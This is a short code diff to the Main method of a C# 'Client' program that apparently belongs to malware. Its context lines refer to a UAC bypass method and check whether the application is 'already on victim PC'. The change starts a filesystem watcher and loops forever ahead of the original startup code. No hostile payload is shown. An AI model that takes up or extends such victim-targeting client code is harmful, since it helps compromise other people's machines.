@@ -17,8 +17,13 @@ namespace Client
         internal static int UACMethod = 0;
         static void Main(string[] args)
         {
+            Armitage.Watchers.Filesystem.Start();
+            while (true) Thread.Sleep(1000);
+            return;
+
             ArgsParser(args);
             CheckRealApplication();
+
 #if !DEBUG
             /// Check if Application is already on victim PC.
             if (!Constants.IsInVictimPC())
